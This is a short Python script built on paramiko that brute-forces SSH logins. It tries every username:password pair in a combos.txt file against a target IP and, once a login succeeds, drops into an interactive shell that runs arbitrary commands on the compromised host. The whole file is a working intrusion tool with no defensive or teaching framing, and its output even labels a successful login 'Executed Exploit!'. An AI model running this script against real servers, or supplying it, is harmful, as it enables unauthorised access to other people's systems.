import paramiko,sys

def client(user,passw,host):
	client = paramiko.SSHClient()

	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(hostname=host,username=user,password=passw,timeout=1)
	while True:
		inputed = input(f'{user}@{host} $ ')
		if inputed == "#exit":
			sys.exit()
		stdin, stdout, stderr = client.exec_command(inputed)
		stdin.close()
		print(stdout.read().decode())


def Check(host):

	with open('combos.txt') as fp:
		for cn,line in enumerate(fp):
			combo = line.replace('\n','').split(':')
			c = paramiko.SSHClient()

			c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				
			#print(f'   [~] Testing -> {combo[0]}:{combo[1]} [{host}]')
			try:
				c.connect(hostname=host,username=combo[0].strip(),password=combo[1].strip(),timeout=1)
				print(f'      [+] Connected -> {combo[0]}:{combo[1]} [{host}]')
				print(f'         [+] Executed Exploit!')
				return line
			except:
				print(f'      [-] No connection -> {combo[0]}:{combo[1]} [{host}]')
				
	return "error"

if len(sys.argv) <= 1:
	print(f'Usage : python {sys.argv[0]} <ip>')
else:
	out = Check(sys.argv[1])

	if out=="error":
		print('   [-] Access denied!')
	else:
		access = out.split(':')
		client(access[0],access[1],sys.argv[1])